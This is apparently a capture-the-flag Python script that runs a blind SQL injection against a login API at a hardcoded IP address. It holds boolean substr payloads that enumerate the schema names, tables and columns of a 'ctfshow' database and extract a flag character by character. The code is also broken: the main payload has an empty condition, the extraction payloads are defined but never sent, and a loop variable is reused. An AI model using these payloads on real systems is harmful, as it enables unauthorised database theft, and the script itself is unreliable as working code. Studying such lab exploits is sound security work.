import string
import requests

chars = string.ascii_lowercase + string.digits + "{}-,"  # abcdefghijklmnopqrstuvwxyz0123456789{}-,

result = ""
url = "http://61.147.171.103:63268" + "/api/login"

payload = {
    "username": "1\\",
    "password": "or (CASE WHEN (1>0) THEN 1 ELSE 0 END)=1-- "
}

for i in range(1, 50):
    result = ""
    for i in range(1, 50):
        temp = 0
        for c in chars:
            payload["password"] = f'or (CASE WHEN () THEN 1 ELSE 0 END)=1-- '
            payload2 = f'and if(substr((select GROUP_CONCAT(SCHEMA_NAME) from information_schema.SCHEMATA),{i},1)="{c}",1,0)--+'
            payload3 = f'and if(substr((select GROUP_CONCAT(table_name) from information_schema.tables where table_schema="ctfshow"),{i},1)="{c}",1,0)--+'
            payload4 = f'and if(substr((select GROUP_CONCAT(column_name) from information_schema.columns where table_schema="ctfshow" and table_name="flagjugg"),{i},1)="{c}",1,0)--+'
            payload5 = f'and if(substr((select GROUP_CONCAT(flag423) from ctfshow.flagjugg),{i},1)="{c}",1,0)--+'
            res = requests.post(url, json=payload)
            temp += 1
            if "No such user or wrong credentials." in res.text:
                result += c
                print(result)
                temp = 0
                continue
            if temp == len(chars):
                print("End")
                exit()
